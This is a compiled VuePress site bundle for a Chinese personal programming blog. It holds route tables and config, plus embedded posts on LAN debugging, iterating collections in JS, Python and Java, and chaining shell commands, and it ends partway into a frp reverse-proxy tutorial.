dataSource/"},{name:"v-153af490",path:"/tag/cors/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-153af490").then(n)},meta:{pid:"tags",id:"cors"}},{path:"/tag/cors/index.html",redirect:"/tag/cors/"},{name:"v-5602cf3c",path:"/tag/spingboot/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-5602cf3c").then(n)},meta:{pid:"tags",id:"spingboot"}},{path:"/tag/spingboot/index.html",redirect:"/tag/spingboot/"},{name:"v-8d47601a",path:"/tag/middleware/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-8d47601a").then(n)},meta:{pid:"tags",id:"middleware"}},{path:"/tag/middleware/index.html",redirect:"/tag/middleware/"},{name:"v-51467ef4",path:"/tag/Springboot/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-51467ef4").then(n)},meta:{pid:"tags",id:"Springboot"}},{path:"/tag/Springboot/index.html",redirect:"/tag/Springboot/"},{name:"v-13cc9138",path:"/tag/port/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-13cc9138").then(n)},meta:{pid:"tags",id:"port"}},{path:"/tag/port/index.html",redirect:"/tag/port/"},{name:"v-36fc09dc",path:"/tag/Swagger3/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-36fc09dc").then(n)},meta:{pid:"tags",id:"Swagger3"}},{path:"/tag/Swagger3/index.html",redirect:"/tag/Swagger3/"},{name:"v-76ecf1d8",path:"/tag/spring/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-76ecf1d8").then(n)},meta:{pid:"tags",id:"spring"}},{path:"/tag/spring/index.html",redirect:"/tag/spring/"},{name:"v-55ca75fb",path:"/tag/Profiles/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-55ca75fb").then(n)},meta:{pid:"tags",id:"Profiles"}},{path:"/tag/Profiles/index.html",redirect:"/tag/Profiles/"},{name:"v-0b30c41e",path:"/tag/resultformat/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-0b30c41e").then(n)},meta:{pid:"tags",id:"resultformat"}},{path:"/tag/resultformat/index.html",redirect:"/tag/resultformat/"},{name:"v-18082c7a",path:"/tag/Java/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-18082c7a").then(n)},meta:{pid:"tags",id:"Java"}},{path:"/tag/Java/index.html",redirect:"/tag/Java/"},{name:"v-b23ef430",path:"/tag/sqlserver/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-b23ef430").then(n)},meta:{pid:"tags",id:"sqlserver"}},{path:"/tag/sqlserver/index.html",redirect:"/tag/sqlserver/"},{name:"v-4c2c8940",path:"/tag/typescript/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-4c2c8940").then(n)},meta:{pid:"tags",id:"typescript"}},{path:"/tag/typescript/index.html",redirect:"/tag/typescript/"},{name:"v-d1c09a98",path:"/tag/eslint/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-d1c09a98").then(n)},meta:{pid:"tags",id:"eslint"}},{path:"/tag/eslint/index.html",redirect:"/tag/eslint/"},{name:"v-19ed615b",path:"/tag/vscode/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-19ed615b").then(n)},meta:{pid:"tags",id:"vscode"}},{path:"/tag/vscode/index.html",redirect:"/tag/vscode/"},{name:"v-32383f72",path:"/tag/git/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-32383f72").then(n)},meta:{pid:"tags",id:"git"}},{path:"/tag/git/index.html",redirect:"/tag/git/"},{name:"v-74ee8da4",path:"/tag/format/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-74ee8da4").then(n)},meta:{pid:"tags",id:"format"}},{path:"/tag/format/index.html",redirect:"/tag/format/"},{name:"v-3235acf0",path:"/tag/jdk/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-3235acf0").then(n)},meta:{pid:"tags",id:"jdk"}},{path:"/tag/jdk/index.html",redirect:"/tag/jdk/"},{name:"v-9ec5a8fa",path:"/tag/tslint/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-9ec5a8fa").then(n)},meta:{pid:"tags",id:"tslint"}},{path:"/tag/tslint/index.html",redirect:"/tag/tslint/"},{name:"v-322ad11c",path:"/tag/vbs/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-322ad11c").then(n)},meta:{pid:"tags",id:"vbs"}},{path:"/tag/vbs/index.html",redirect:"/tag/vbs/"},{name:"v-30aac6ad",path:"/tag/mklink/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-30aac6ad").then(n)},meta:{pid:"tags",id:"mklink"}},{path:"/tag/mklink/index.html",redirect:"/tag/mklink/"},{name:"v-13713edc",path:"/tag/swap/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-13713edc").then(n)},meta:{pid:"tags",id:"swap"}},{path:"/tag/swap/index.html",redirect:"/tag/swap/"},{name:"v-32296a6e",path:"/tag/wsl/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-32296a6e").then(n)},meta:{pid:"tags",id:"wsl"}},{path:"/tag/wsl/index.html",redirect:"/tag/wsl/"},{name:"v-13d93f80",path:"/tag/path/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-13d93f80").then(n)},meta:{pid:"tags",id:"path"}},{path:"/tag/path/index.html",redirect:"/tag/path/"},{name:"v-219fdf4c",path:"/tag/powershell/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-219fdf4c").then(n)},meta:{pid:"tags",id:"powershell"}},{path:"/tag/powershell/index.html",redirect:"/tag/powershell/"},{name:"v-323d0738",path:"/tag/bat/",component:Zt,beforeEnter:function(e,t,n){mt("Tag","v-323d0738").then(n)},meta:{pid:"tags",id:"bat"}},{path:"/tag/bat/index.html",redirect:"/tag/bat/"},{name:"v-60324296",path:"/categories/favorite/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-60324296").then(n)},meta:{pid:"categories",id:"favorite"}},{path:"/categories/favorite/index.html",redirect:"/categories/favorite/"},{name:"v-17bcdfdc",path:"/categories/front-end-js/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-17bcdfdc").then(n)},meta:{pid:"categories",id:"front-end-js"}},{path:"/categories/front-end-js/index.html",redirect:"/categories/front-end-js/"},{name:"v-62faafef",path:"/categories/java/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-62faafef").then(n)},meta:{pid:"categories",id:"java"}},{path:"/categories/java/index.html",redirect:"/categories/java/"},{name:"v-51947962",path:"/categories/command/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-51947962").then(n)},meta:{pid:"categories",id:"command"}},{path:"/categories/command/index.html",redirect:"/categories/command/"},{name:"v-582de14a",path:"/categories/deploy/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-582de14a").then(n)},meta:{pid:"categories",id:"deploy"}},{path:"/categories/deploy/index.html",redirect:"/categories/deploy/"},{name:"v-69fdaa06",path:"/categories/setting/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-69fdaa06").then(n)},meta:{pid:"categories",id:"setting"}},{path:"/categories/setting/index.html",redirect:"/categories/setting/"},{name:"v-00326c59",path:"/categories/linux/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-00326c59").then(n)},meta:{pid:"categories",id:"linux"}},{path:"/categories/linux/index.html",redirect:"/categories/linux/"},{name:"v-07d8a201",path:"/categories/front-end-angular/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-07d8a201").then(n)},meta:{pid:"categories",id:"front-end-angular"}},{path:"/categories/front-end-angular/index.html",redirect:"/categories/front-end-angular/"},{name:"v-30977c3c",path:"/categories/base64/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-30977c3c").then(n)},meta:{pid:"categories",id:"base64"}},{path:"/categories/base64/index.html",redirect:"/categories/base64/"},{name:"v-dfe56800",path:"/categories/front-end-css/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-dfe56800").then(n)},meta:{pid:"categories",id:"front-end-css"}},{path:"/categories/front-end-css/index.html",redirect:"/categories/front-end-css/"},{name:"v-24c892b6",path:"/categories/database/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-24c892b6").then(n)},meta:{pid:"categories",id:"database"}},{path:"/categories/database/index.html",redirect:"/categories/database/"},{name:"v-80baa5e8",path:"/categories/docker-compose/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-80baa5e8").then(n)},meta:{pid:"categories",id:"docker-compose"}},{path:"/categories/docker-compose/index.html",redirect:"/categories/docker-compose/"},{name:"v-140be591",path:"/categories/security/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-140be591").then(n)},meta:{pid:"categories",id:"security"}},{path:"/categories/security/index.html",redirect:"/categories/security/"},{name:"v-68868b31",path:"/categories/docker/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-68868b31").then(n)},meta:{pid:"categories",id:"docker"}},{path:"/categories/docker/index.html",redirect:"/categories/docker/"},{name:"v-7f0e4e05",path:"/categories/es6/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-7f0e4e05").then(n)},meta:{pid:"categories",id:"es6"}},{path:"/categories/es6/index.html",redirect:"/categories/es6/"},{name:"v-32f84b5a",path:"/categories/big-data/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-32f84b5a").then(n)},meta:{pid:"categories",id:"big-data"}},{path:"/categories/big-data/index.html",redirect:"/categories/big-data/"},{name:"v-71e30ef0",path:"/categories/front-end-html/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-71e30ef0").then(n)},meta:{pid:"categories",id:"front-end-html"}},{path:"/categories/front-end-html/index.html",redirect:"/categories/front-end-html/"},{name:"v-00e73a13",path:"/categories/back-end-java/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-00e73a13").then(n)},meta:{pid:"categories",id:"back-end-java"}},{path:"/categories/back-end-java/index.html",redirect:"/categories/back-end-java/"},{name:"v-03ede732",path:"/categories/kafka/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-03ede732").then(n)},meta:{pid:"categories",id:"kafka"}},{path:"/categories/kafka/index.html",redirect:"/categories/kafka/"},{name:"v-029715c2",path:"/categories/markdown/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-029715c2").then(n)},meta:{pid:"categories",id:"markdown"}},{path:"/categories/markdown/index.html",redirect:"/categories/markdown/"},{name:"v-211ea8fe",path:"/categories/back-end-maven/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-211ea8fe").then(n)},meta:{pid:"categories",id:"back-end-maven"}},{path:"/categories/back-end-maven/index.html",redirect:"/categories/back-end-maven/"},{name:"v-155fc016",path:"/categories/python/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-155fc016").then(n)},meta:{pid:"categories",id:"python"}},{path:"/categories/python/index.html",redirect:"/categories/python/"},{name:"v-35a5adeb",path:"/categories/io/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-35a5adeb").then(n)},meta:{pid:"categories",id:"io"}},{path:"/categories/io/index.html",redirect:"/categories/io/"},{name:"v-17bc94c8",path:"/categories/front-end-ts/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-17bc94c8").then(n)},meta:{pid:"categories",id:"front-end-ts"}},{path:"/categories/front-end-ts/index.html",redirect:"/categories/front-end-ts/"},{name:"v-1f37d86c",path:"/categories/typescript/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-1f37d86c").then(n)},meta:{pid:"categories",id:"typescript"}},{path:"/categories/typescript/index.html",redirect:"/categories/typescript/"},{name:"v-0e2e1052",path:"/categories/tools/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-0e2e1052").then(n)},meta:{pid:"categories",id:"tools"}},{path:"/categories/tools/index.html",redirect:"/categories/tools/"},{name:"v-616ad24e",path:"/categories/hot-key/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-616ad24e").then(n)},meta:{pid:"categories",id:"hot-key"}},{path:"/categories/hot-key/index.html",redirect:"/categories/hot-key/"},{name:"v-278be467",path:"/categories/vscode/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-278be467").then(n)},meta:{pid:"categories",id:"vscode"}},{path:"/categories/vscode/index.html",redirect:"/categories/vscode/"},{name:"v-33031d2a",path:"/categories/windows/",component:Zt,beforeEnter:function(e,t,n){mt("Category","v-33031d2a").then(n)},meta:{pid:"categories",id:"windows"}},{path:"/categories/windows/index.html",redirect:"/categories/windows/"},{name:"v-169d88f6",path:"/tag/JavaScript/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-169d88f6").then(n)},meta:{pid:"tags",id:"JavaScript"}},{path:"/tag/JavaScript/page/2/index.html",redirect:"/tag/JavaScript/page/2/"},{name:"v-169d88b8",path:"/tag/JavaScript/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-169d88b8").then(n)},meta:{pid:"tags",id:"JavaScript"}},{path:"/tag/JavaScript/page/3/index.html",redirect:"/tag/JavaScript/page/3/"},{name:"v-0a6419e2",path:"/tag/command/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-0a6419e2").then(n)},meta:{pid:"tags",id:"command"}},{path:"/tag/command/page/2/index.html",redirect:"/tag/command/page/2/"},{name:"v-f760330c",path:"/tag/java/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-f760330c").then(n)},meta:{pid:"tags",id:"java"}},{path:"/tag/java/page/2/index.html",redirect:"/tag/java/page/2/"},{name:"v-f4b88d90",path:"/tag/linux/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-f4b88d90").then(n)},meta:{pid:"tags",id:"linux"}},{path:"/tag/linux/page/2/index.html",redirect:"/tag/linux/page/2/"},{name:"v-f4b88d52",path:"/tag/linux/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-f4b88d52").then(n)},meta:{pid:"tags",id:"linux"}},{path:"/tag/linux/page/3/index.html",redirect:"/tag/linux/page/3/"},{name:"v-4a41ab03",path:"/tag/html/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-4a41ab03").then(n)},meta:{pid:"tags",id:"html"}},{path:"/tag/html/page/2/index.html",redirect:"/tag/html/page/2/"},{name:"v-25b6ec10",path:"/tag/docker/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-25b6ec10").then(n)},meta:{pid:"tags",id:"docker"}},{path:"/tag/docker/page/2/index.html",redirect:"/tag/docker/page/2/"},{name:"v-25b6ebd2",path:"/tag/docker/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-25b6ebd2").then(n)},meta:{pid:"tags",id:"docker"}},{path:"/tag/docker/page/3/index.html",redirect:"/tag/docker/page/3/"},{name:"v-1bebad6b",path:"/categories/front-end-js/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-1bebad6b").then(n)},meta:{pid:"categories",id:"front-end-js"}},{path:"/categories/front-end-js/page/2/index.html",redirect:"/categories/front-end-js/page/2/"},{name:"v-1bebad8a",path:"/categories/front-end-js/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-1bebad8a").then(n)},meta:{pid:"categories",id:"front-end-js"}},{path:"/categories/front-end-js/page/3/index.html",redirect:"/categories/front-end-js/page/3/"},{name:"v-4ad40d33",path:"/categories/deploy/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-4ad40d33").then(n)},meta:{pid:"categories",id:"deploy"}},{path:"/categories/deploy/page/2/index.html",redirect:"/categories/deploy/page/2/"},{name:"v-4ad40d52",path:"/categories/deploy/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-4ad40d52").then(n)},meta:{pid:"categories",id:"deploy"}},{path:"/categories/deploy/page/3/index.html",redirect:"/categories/deploy/page/3/"},{name:"v-a0427978",path:"/categories/linux/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-a0427978").then(n)},meta:{pid:"categories",id:"linux"}},{path:"/categories/linux/page/2/index.html",redirect:"/categories/linux/page/2/"},{name:"v-a042793a",path:"/categories/linux/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-a042793a").then(n)},meta:{pid:"categories",id:"linux"}},{path:"/categories/linux/page/3/index.html",redirect:"/categories/linux/page/3/"},{name:"v-0733f04a",path:"/categories/back-end-java/page/2/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-0733f04a").then(n)},meta:{pid:"categories",id:"back-end-java"}},{path:"/categories/back-end-java/page/2/index.html",redirect:"/categories/back-end-java/page/2/"},{name:"v-0733f069",path:"/categories/back-end-java/page/3/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-0733f069").then(n)},meta:{pid:"categories",id:"back-end-java"}},{path:"/categories/back-end-java/page/3/index.html",redirect:"/categories/back-end-java/page/3/"},{name:"v-0733f088",path:"/categories/back-end-java/page/4/",component:Zt,beforeEnter:function(e,t,n){mt("Layout","v-0733f088").then(n)},meta:{pid:"categories",id:"back-end-java"}},{path:"/categories/back-end-java/page/4/index.html",redirect:"/categories/back-end-java/page/4/"},{path:"*",component:Zt}],Xt={title:"clearlove's blog",description:"禅与计算机编程艺术",base:"/",headTags:[["link",{rel:"icon",href:"/favicon.ico"}],["meta",{"http-equiv":"X-UA-Compatible",content:"IE=edge"}],["meta",{name:"viewport",content:"width=device-width,initial-scale=1,user-scalable=no"}],["link",{rel:"manifest",href:"/manifest.json"}],["meta",{name:"theme-color",content:"#42b983"}],["meta",{name:"apple-mobile-web-app-capable",content:"yes"}],["meta",{name:"apple-mobile-web-app-status-bar-style",content:"black"}],["link",{rel:"apple-touch-icon",href:"/icon_vuepress_reco.png"}],["link",{rel:"mask-icon",href:"/icon_vuepress_reco.svg",color:"#42b983"}],["meta",{name:"msapplication-TileImage",content:"/icon_vuepress_reco.png"}],["meta",{name:"msapplication-TileColor",content:"#000000"}]],pages:[{title:"一些有用的网站集锦",frontmatter:{title:"一些有用的网站集锦",date:"9999-12-31T13:28:26.000Z",tags:[],categories:"favorite",published:!0,hideInList:!1,feature:null,isTop:!0},regularPath:"/blogs/2021/DBgvbp5Vm.html",relativePath:"blogs/2021/DBgvbp5Vm.md",key:"v-6f173a07",path:"/blogs/2021/DBgvbp5Vm.html",headers:[{level:2,title:"Front && Back Sample",slug:"front-back-sample"},{level:2,title:"Front",slug:"front"},{level:2,title:"Back",slug:"back"},{level:2,title:"Package Manager",slug:"package-manager"},{level:2,title:"Database",slug:"database"},{level:2,title:"Deploy",slug:"deploy"},{level:2,title:"Tool",slug:"tool"},{level:2,title:"docker",slug:"docker"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Front && Back Sample \n realworld \n Front \n \n \n https://tool.chinaz.com/tools/jscodeconfusion.aspx \n \n \n CSS、JavaScript 查找浏览器兼容性 \n \n \n HTML 官方文档 \n \n \n MDN WEB DOC \n \n \n openbase \n \n \n 10 Best Angular Chart Libraries \n \n \n JSON 工具 \n \n \n UI Components \n \n \n Material \n \n \n DevUI \n \n \n NG-Bootstrap \n \n \n NGX-Bootstrap \n \n \n ng-zorro \n Back \n \n \n jar-search \n \n \n Hutool \n \n \n postwoman \n \n \n CROS \n \n \n Apache Maven \n Package Manager \n \n \n mvnrepository \n \n \n yarn \n Database \n \n \n SQL Server Data Types \n \n \n PostgreSQL Data Types \n \n \n PostgreSQL schema \n Deploy \n \n Nginx在线配置 \n Tool \n \n tools \n docker \n docker \n"},{title:"Home",frontmatter:{home:!0,bgImage:"/banner.jpg",bgImageStyle:{height:"450px"},faceImage:"/head.png",heroImage:"/head.jpg",heroImageStyle:{maxHeight:"200px",display:"block",margin:"3rem auto 0rem",borderRadius:"50%",boxShadow:"0 5px 18px rgba(0,0,0,0.2)"},isShowTitleInHome:!0,actionText:"About Me",actionLink:"/views/personalInfo/",features:[{title:"Who am I？",details:"A programmer? A human being? Or a matter combination?"},{title:"Where am I？",details:"In a city? On earth? Or in a small part of space?"},{title:"What am I gona do？",details:"Work? Struggle? Or go to a destination I don't know?"}],footer:"somenzz"},regularPath:"/",relativePath:"README.md",key:"v-4a7c8606",path:"/",lastUpdated:"3/6/2022, 3:57:06 PM",content:""},{title:"局域网调试本地项目的方法",frontmatter:{title:"局域网调试本地项目的方法",date:"2021-10-10 00:03:59",tags:["Angular","Python"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/LAN-debugging.html",relativePath:"blogs/2021/LAN-debugging.md",key:"v-055534f5",path:"/blogs/2021/LAN-debugging.html",headers:[{level:2,title:"启动",slug:"启动"},{level:2,title:"启动",slug:"启动-2"},{level:2,title:"启动",slug:"启动-3"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在混合开发中，Android原生可能需要连本地的Angular项目去调试，首先要保证的是手机和电脑是在用一个局域网下，同时要关闭防火墙，否则可能无法正常访问 \n 关闭防火墙 \n 先获取本机ip地址 \n 获取方式很简单，以Windows为例，直接在cmd中输入ipconfig回车 \n Anglar项目 \n 启动 \n ng serve --host  0.0 .0.0 --port  4200 \n \n 1 或者 \n ng serve --host 你的ip地址 --port  4200 \n \n 1 #  Python项目 \n 启动 \n uvicorn main:app --host  0.0 .0.0 --port  8000  --reload\n \n 1 或者 \n uvicorn main:app --host 你的ip地址 --port  8000  --reload\n \n 1 #  Springboot项目 \n 修改application.yml文件 \n server : \n   address :  0.0.0.0\n   port :   8080 \n \n 1 2 3 或者application.properties文件 \n server.address=0.0.0.0\nserver.port=8080\n \n 1 2 #  NodeJs项目 \n 启动 \n node index.js --host  0.0 .0.0\n \n 1 "},{title:"JS中判断对象是否包含某个key的方法",frontmatter:{title:"JS中判断对象是否包含某个key的方法",date:"2021-07-18T23:58:17.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/_11_temp.html",relativePath:"blogs/2021/_11_temp.md",key:"v-56b06655",path:"/blogs/2021/_11_temp.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:""},{title:"关于",frontmatter:{title:"关于",date:"2019-01-25T19:09:48.000Z",tags:[],published:!0,hideInList:!0,feature:null,isTop:!1},regularPath:"/blogs/2021/about.html",relativePath:"blogs/2021/about.md",key:"v-1b370f62",path:"/blogs/2021/about.html",headers:[{level:2,title:"🏠 关于本站",slug:"🏠-关于本站"},{level:2,title:"👨‍💻 博主是谁",slug:"👨‍💻-博主是谁"},{level:2,title:"⛹ 兴趣爱好",slug:"⛹-兴趣爱好"},{level:2,title:"📬 联系我呀",slug:"📬-联系我呀"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n 欢迎来到我的小站呀，很高兴遇见你！🤝 \n 🏠 关于本站 \n 👨‍💻 博主是谁 \n ⛹ 兴趣爱好 \n 📬 联系我呀 \n"},{title:"前后端分离与不分离的本质区别",frontmatter:{title:"前后端分离与不分离的本质区别",date:"2021-10-31 22:57:57",tags:["back-end","front-end"],categories:"java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/back_end_front_end.html",relativePath:"blogs/2021/back_end_front_end.md",key:"v-0127fc35",path:"/blogs/2021/back_end_front_end.html",headers:[{level:2,title:"前后端不分离",slug:"前后端不分离"},{level:2,title:"前后端分离",slug:"前后端分离"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 前后端不分离 \n 在前后端不分离的应用模式中，前端页面看到的效果都是由后端控制，由后端渲染页面或重定向，也就是后端需要控制前端的展示，前端与后端的耦合度很高。\n请求的数据交互如下图: \n \n 这种应用模式比较适合纯网页应用，但是当后端对接App时，App可能并不需要后端返回一个HTML网页，而仅仅是数据本身，所以后端原本返回网页的接口不适用于前端App应用，为了对接App后端还需再开发一套接口。 \n 前后端分离 \n 在前后端分离的应用模式中，后端仅返回前端所需的数据，不再渲染HTML页面，不再控制前端的效果。至于前端用户看到什么效果，从后端请求的数据如何加载到前端中，都由前端自己决定，网页有网页的处理方式，App有App的处理方式，但无论哪种前端，所需的数据基本相同，后端仅需开发一套逻辑对外提供数据即可。 \n 对应的数据交互如下图 : \n \n 在前后端分离的应用模式中 ，前端与后端的耦合度相对较低。在前后端分离的应用模式中，我们通常将后端开发的每个视图都称为一个接口，或者API，前端通过访问接口来对数据进行增删改查。 \n"},{title:"不同语言遍历list map 和对象",frontmatter:{title:"不同语言遍历list map 和对象",date:"2021-05-13T10:34:54.000Z",tags:["list","map","JavaScript","Python"],published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/bu-tong-yu-yan-bian-li-list-map-he-dui-xiang.html",relativePath:"blogs/2021/bu-tong-yu-yan-bian-li-list-map-he-dui-xiang.md",key:"v-7fe11355",path:"/blogs/2021/bu-tong-yu-yan-bian-li-list-map-he-dui-xiang.html",headers:[{level:2,title:"遍历数组",slug:"遍历数组"},{level:2,title:"遍历map",slug:"遍历map"},{level:2,title:"遍历对象",slug:"遍历对象"},{level:2,title:"遍历数组",slug:"遍历数组-2"},{level:2,title:"遍历map(字典)",slug:"遍历map-字典"},{level:2,title:"遍历json对象",slug:"遍历json对象"},{level:2,title:"遍历list",slug:"遍历list"},{level:2,title:"遍历map",slug:"遍历map-2"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' JavaScript \n 原生javascript没有List \n 遍历数组 \n { \n     let  array  =   new   Array ( ) ; \n    array . push ( "test1" ) ; \n    array . push ( "test2" ) ; \n    array . forEach ( v   =>  console . log ( v ) ) ; \t     // test1 test2 \n } \n \n 1 2 3 4 5 6 #  遍历map \n { \n     let  map  =   new   Map ( ) ; \n    map . set ( "1" , "test1" ) ; \n    map . set ( "2" , "test2" ) ; \n    map . forEach ( ( v , k , map )   =>  console . log ( { k , v } ) ) ;     // {k: "1", v: "test1"} {k: "2", v: "test2"} \n } \n \n 1 2 3 4 5 6 #  遍历对象 \n { \n     let  object  =   new   Object ( ) ; \n    object  =   { 1 : "test1" , 2 : "test2" } ; \n     for ( let  k  in  object ) { \n         let  v  =  object [ i ] ; \n        console . log ( { k , v } )      // {k: "1", v: "test1"} {k: "2", v: "test2"} \n     } \n } \n \n 1 2 3 4 5 6 7 8 #  python \n 遍历数组 \n list   =   [ 1 ,   2 ,   3 ,   4 ] \n for  i  in   range ( len ( list ) ) : \n     print ( "序号：%s   值：%s"   %   ( i  +   1 ,   list [ i ] ) )    # 序号：1   值：1 序号：2   值：2 序号：3   值：3 序号：4   值：4 \n \n 1 2 3 #  遍历map(字典) \n map   =   { "a" :   "1" ,   "b" :   "2" ,   "c" :   "3" } \n\n for  k ,  v  in   map . items ( ) : \n     print ( { k ,  v } )    # {"1", "a"} {"2", "b"} {"3", "c"} \n \n 1 2 3 4 #  遍历json对象 \n import  json\njson  =   "{ " name ":" Bill ", " age ":63, " city ":" Seattle "}" \n map   =  json . loads ( json ) \n for  k ,  v  in   map . items ( ) : \n     print ( { k ,  v } ) \n \n 1 2 3 4 5 #  java \n 遍历list \n String [ ]  array  =   { "1"   , "2" ,   "3" ,   "4" } ; \n List < String >  list  =   Arrays . asList ( array ) ; \nlist . forEach ( v  ->   System . out . println ( v ) ) ;     // 1 2 3 4 \n \n 1 2 3 #  遍历map \n Map < String ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( "1" ,   "test1" ) ; \nmap . put ( "2" ,   "test2" ) ; \nmap . forEach ( ( k ,  v )   ->   System . out . println ( "k:"   +  k  +   " v:"   +  v ) ) ;   // k:1 v:test1 k:2 v:test2 \n \n 1 2 3 4 '},{title:"一次执行多条命令",frontmatter:{title:"一次执行多条命令",date:"2021-08-29T10:45:46.000Z",tags:["command"],categories:"command",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/execute-multiple-commands.html",relativePath:"blogs/2021/execute-multiple-commands.md",key:"v-d0fbf362",path:"/blogs/2021/execute-multiple-commands.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" cmd \n 使用 &&  拼接多条命令 \n cd   ..   &&   dir \n \n 1 #  powershell \n 使用 ;  拼接多条命令 \n cd   ..   ;   ls \n \n 1 #  linux \n 使用 &&  拼接多条命令 \n cd   ..   &&   ls \n \n 1 "},{title:"使用frp进行内网穿透",frontmatter:{title:"使用frp进行内网穿透",date:"2021-08-29 11:19:16",tags:["frp"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/frp-intranet-penetration.html",relativePath:"blogs/2021/frp-intranet-penetration.md",key:"v-73d15695",path:"/blogs/2021/frp-intranet-penetration.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 为什么需要内网穿透功能 \n 从公网中访问自己的私有设备向来是一件难事儿。\n自己的主力台式机、NAS等等设备，它们可能处于路由器后，或者运营商因为IP地址短缺不给你分配公网IP地址。如果我们想直接访问到这些设备（远程桌面，远程文件，SSH等等），一般来说要通过一些转发或者P2P组网软件的帮助。\n我有一台计算机位于一个很复杂的局域网中，我想要实现远程桌面和文件访问，目前来看其所处的网络环境很难通过简单的端口映射将其暴露在公网之中，我试过这么几种方法： \n \n 远程桌面使用TeamViewer。可用，但需要访问端也拥有TeamViewer软件，不是很方便，希望能使用Windows自带的远程桌面。且TeamViewer不易实现远程文件访问。 \n 使用蒲公英VPN软件进行组网，可用，但免费版本网络速度极慢，体验不佳，几乎无法正常使用。 \n 使用花生壳软件进行DDNS解析，可用，但同第二点所述，免费版本有带宽限制，无法实际使用。 \n 搭建frp服务器进行内网穿透，可用且推荐，可以达到不错的速度，且理论上可以开放任何想要的端口，可以实现的功能远不止远程桌面或者文件共享。 \n frp是什么 \n 简单地说，frp就是一个反向代理软件，它体积轻量但功能很强大，可以使处于内网或防火墙后的设备对外界提供服务，它支持HTTP、TCP、UDP等众多协议。我们今天仅讨论TCP和UDP相关的内容。 \n 准备工作 \n 搭建一个完整的frp服务链，我们需要 \n \n 